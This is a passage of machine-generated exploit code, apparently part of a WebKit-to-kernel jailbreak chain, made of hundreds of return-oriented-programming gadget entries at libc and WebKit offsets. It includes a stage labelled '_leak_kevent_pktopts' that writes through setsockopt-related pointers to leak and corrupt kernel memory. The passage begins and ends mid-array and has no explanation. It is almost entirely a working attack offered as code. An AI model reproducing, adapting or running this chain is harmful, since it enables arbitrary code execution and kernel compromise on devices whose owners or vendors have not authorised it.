libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+303472,//L5482
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5482:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+303600,//L5483
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+303632,//L5485
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+303616,//L5484
webkit_base+4687784,
libc_base+165442
]);
//L5483:
db([0,0]);
set_gadget(libc_base+772328,);
//L5484:
db([0,0]);
set_gadget(libc_base+768796,);
//L5485:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+303760,//L5487
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+303776,//L5488
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+303744,//L5486
webkit_base+4687784,
libc_base+165442
]);
//L5486:
db([0,0]);
set_gadget(libc_base+772328,);
//L5487:
db([0,0]);
set_gadget(libc_base+768796,);
//L5488:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+303880,//L5489
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+303896,//L5490
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L5489:
db([0,0]);
set_gadget(libc_base+768796,);
//L5490:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+304016,//L5491
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+304000,//L5492
webkit_base+4687784,
libc_base+768796
]);
//L5492:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L5491:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+304104,//L5494
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+304088,//L5493
webkit_base+4687784,
libc_base+165442
]);
//L5493:
db([0,0]);
set_gadget(libc_base+768796,);
//L5494:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+304208,//L5495
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+304224,//L5496
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L5495:
db([0,0]);
set_gadget(libc_base+768796,);
//L5496:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+304344,//L5497
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+304328,//L5498
webkit_base+4687784,
libc_base+768796
]);
//L5498:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L5497:
db([0,0]);
//L5427:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
setsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+305672,//L5499
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L5499:
db([0,0]);
//_leak_kevent_pktopts:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+305744,//L5501
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L5501:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+305808,//L5503
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L5503:
db([0,0]);
set_gadget(libc_base+713278,);
db([2104,0]);// 0x838
set_gadgets([
libc_base+207036,
//L5504:
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+305904,//L5507
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5505:
db([4294965216,4294967295]);// -0x820
set_gadget(libc_base+772328,);
//L5507:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+305976,//L5510
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5508:
db([4294965208,4294967295]);// -0x828
set_gadget(libc_base+772328,);
//L5510:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5511:
db([16,0]);// 0x10
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+306104,//L5514
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+306120,//L5515
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5514:
db([0,0]);
set_gadget(libc_base+772328,);
//L5515:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+306264,//L5518
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+306280,//L5519
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+306248,//L5517
webkit_base+4687784,
libc_base+713278
]);
//L5516:
db([20,0]);// 0x14
set_gadget(libc_base+165442,);
//L5517:
db([0,0]);
set_gadget(libc_base+772328,);
//L5518:
db([0,0]);
set_gadget(libc_base+768796,);
//L5519:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+306368,//L5521
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+306384,//L5522
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5521:
db([0,0]);
set_gadget(libc_base+772328,);
//L5522:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+306544,//L5524
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+306576,//L5526
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+306528,//L5523
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+306560,//L5525
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5523:
db([0,0]);
set_gadget(libc_base+165442,);
//L5524:
db([0,0]);
set_gadget(libc_base+772328,);
//L5525:
db([0,0]);
set_gadget(libc_base+768796,);
//L5526:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+306656,//L5527
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+306672,//L5528
webkit_base+4687784,
libc_base+165442
]);
//L5527:
db([0,0]);
set_gadget(libc_base+768796,);
//L5528:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+306768,//L5530
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+306752,//L5529
webkit_base+4687784,
libc_base+165442
]);
//L5529:
db([0,0]);
set_gadget(libc_base+768796,);
//L5530:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+306864,//L5533
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5531:
db([4294965208,4294967295]);// -0x828
set_gadget(libc_base+772328,);
//L5533:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+306952,//L5535
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+306968,//L5536
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5535:
db([0,0]);
set_gadget(libc_base+772328,);
//L5536:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+307072,//L5539
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+307056,//L5538
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L5538:
db([0,0]);
set_gadget(libc_base+772328,);
//L5539:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+307128,//L5541
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5541:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796
]);
//L5542:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5543:
db([1,0]);// 0x1
set_gadget(libc_base+772328,);
//L5544:
db([1,0]);// 0x1
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+307408,//L5546
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+307424,//L5547
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+307392,//L5545
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5545:
db([0,0]);
set_gadget(libc_base+165442,);
//L5546:
db([0,0]);
set_gadget(libc_base+768796,);
//L5547:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+307584,//L5551
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+307536,//L5548
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+307552,//L5549
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5548:
db([0,0]);
set_gadget(libc_base+165442,);
//L5549:
db([0,0]);
set_gadget(libc_base+772328,);
//L5550:
db([16,0]);// 0x10
set_gadget(libc_base+768796,);
//L5551:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+307640,//L5553
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L5553:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+307752,//L5554
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+307784,//L5556
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+307768,//L5555
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5554:
db([0,0]);
set_gadget(libc_base+772328,);
//L5555:
db([0,0]);
set_gadget(libc_base+768796,);
//L5556:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+307880,//L5558
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+307864,//L5557
webkit_base+4687784,
libc_base+165442
]);
//L5557:
db([0,0]);
set_gadget(libc_base+768796,);
//L5558:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+307976,//L5561
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5559:
db([4294965208,4294967295]);// -0x828
set_gadget(libc_base+772328,);
//L5561:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+308064,//L5563
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+308080,//L5564
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5563:
db([0,0]);
set_gadget(libc_base+772328,);
//L5564:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+308184,//L5567
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+308168,//L5566
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L5566:
db([0,0]);
set_gadget(libc_base+772328,);
//L5567:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+308256,//L5570
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L5568:
db([8,0]);// 0x8
set_gadget(libc_base+772328,);
//L5570:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+308312,//L5572
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L5572:
db([0,0]);
set_gadgets([
libc_base+524088,//mov [rdi],cx
libc_base+713278,
ropchain+308368,//L5574
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L5574:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+308464,//L5576
webkit_base+4687784,
libc_base+768796
]);
//L5575:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L5576:
db([0,0]);
set_gadget(libc_base+165442,);
//L5577:
db([1,0]);// 0x1
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+308640,//L5581
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+308592,//L5578
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+308608,//L5579
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5578:
db([0,0]);
set_gadget(libc_base+165442,);
//L5579:
db([0,0]);
set_gadget(libc_base+772328,);
//L5580:
db([48,0]);
set_gadget(libc_base+768796,);
//L5581:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+308744,//L5583
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+308728,//L5582
webkit_base+4687784,
libc_base+772328
]);
//L5582:
db([0,0]);
set_gadget(libc_base+768796,);
//L5583:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+308840,//L5586
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5584:
db([4294965208,4294967295]);// -0x828
set_gadget(libc_base+772328,);
//L5586:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+308928,//L5588
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+308944,//L5589
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5588:
db([0,0]);
set_gadget(libc_base+772328,);
//L5589:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+309048,//L5592
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+309032,//L5591
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L5591:
db([0,0]);
set_gadget(libc_base+772328,);
//L5592:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+309120,//L5595
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L5593:
db([10,0]);// 0xa
set_gadget(libc_base+772328,);
//L5595:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+309176,//L5597
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L5597:
db([0,0]);
set_gadgets([
libc_base+524088,//mov [rdi],cx
libc_base+713278,
ropchain+309232,//L5599
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L5599:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+309328,//L5601
webkit_base+4687784,
libc_base+768796
]);
//L5600:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L5601:
db([0,0]);
set_gadget(libc_base+165442,);
//L5602:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+309440,//L5604
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+309424,//L5603
webkit_base+4687784,
libc_base+165442
]);
//L5603:
db([0,0]);
set_gadget(libc_base+768796,);
//L5604:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+309536,//L5607
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5605:
db([4294965208,4294967295]);// -0x828
set_gadget(libc_base+772328,);
//L5607:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+309624,//L5609
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+309640,//L5610
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5609:
db([0,0]);
set_gadget(libc_base+772328,);
//L5610:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+309744,//L5613
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+309728,//L5612
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L5612:
db([0,0]);
set_gadget(libc_base+772328,);
//L5613:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+309816,//L5616
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L5614:
db([12,0]);// 0xc
set_gadget(libc_base+772328,);
//L5616:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+309928,//L5618
webkit_base+4687784,
libc_base+768796
]);
//L5617:
db([5,0]);// 0x5
set_gadget(webkit_base+3789839,);//pop r11
//L5618:
db([0,0]);
set_gadget(libc_base+165442,);
//L5619:
db([5,0]);// 0x5
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+310040,//L5621
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+310024,//L5620
webkit_base+4687784,
libc_base+165442
]);
//L5620:
db([0,0]);
set_gadget(libc_base+768796,);
//L5621:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+310136,//L5624
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5622:
db([4294965208,4294967295]);// -0x828
set_gadget(libc_base+772328,);
//L5624:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+310224,//L5626
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+310240,//L5627
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5626:
db([0,0]);
set_gadget(libc_base+772328,);
//L5627:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+310344,//L5630
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+310328,//L5629
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L5629:
db([0,0]);
set_gadget(libc_base+772328,);
//L5630:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+310416,//L5633
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L5631:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L5633:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796
]);
//L5634:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+310576,//L5637
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5635:
db([4294965208,4294967295]);// -0x828
set_gadget(libc_base+772328,);
//L5637:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+310664,//L5639
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+310680,//L5640
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5639:
db([0,0]);
set_gadget(libc_base+772328,);
//L5640:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+310784,//L5643
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+310768,//L5642
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L5642:
db([0,0]);
set_gadget(libc_base+772328,);
//L5643:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+310856,//L5646
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L5644:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L5646:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+310968,//L5648
webkit_base+4687784,
libc_base+768796
]);
//L5647:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L5648:
db([0,0]);
set_gadget(libc_base+165442,);
//L5649:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+311112,//L5652
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+311144,//L5654
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+311128,//L5653
webkit_base+4687784,
libc_base+713278
]);
//L5651:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L5652:
db([0,0]);
set_gadget(libc_base+165442,);
//L5653:
db([0,0]);
set_gadget(libc_base+768796,);
//L5654:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+311256,//L5655+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+311248,//L5655
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L5655:
db([0,0]);
set_gadgets([
ropchain+311272,//L5655+24
ropchain+311288,//L5650
libc_base+489696,//pop rsp
ropchain+305840,//L5504
//L5650:
//L5656:
libc_base+768796
]);
//L5657:
db([2048,0]);// 0x800
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+311392,//L5659
webkit_base+4687784,
libc_base+713278
]);
//L5658:
db([4294965248,4294967295]);// -0x800
set_gadget(libc_base+768796,);
//L5659:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+311496,//L5662
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5660:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L5662:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+311584,//L5664
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+311600,//L5665
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5664:
db([0,0]);
set_gadget(libc_base+772328,);
//L5665:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+311760,//L5667
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+311792,//L5669
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+311744,//L5666
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+311776,//L5668
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5666:
db([0,0]);
set_gadget(libc_base+165442,);
//L5667:
db([0,0]);
set_gadget(libc_base+772328,);
//L5668:
db([0,0]);
set_gadget(libc_base+768796,);
//L5669:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+311888,//L5671
webkit_base+4687784,
